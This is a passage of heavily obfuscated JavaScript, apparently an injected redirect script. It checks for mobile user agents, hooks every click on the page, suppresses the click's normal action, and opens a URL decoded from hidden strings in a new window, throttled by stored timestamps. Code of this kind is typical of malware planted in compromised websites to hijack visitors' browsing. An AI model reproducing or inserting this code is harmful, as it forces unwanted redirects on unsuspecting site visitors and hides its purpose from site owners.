)|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());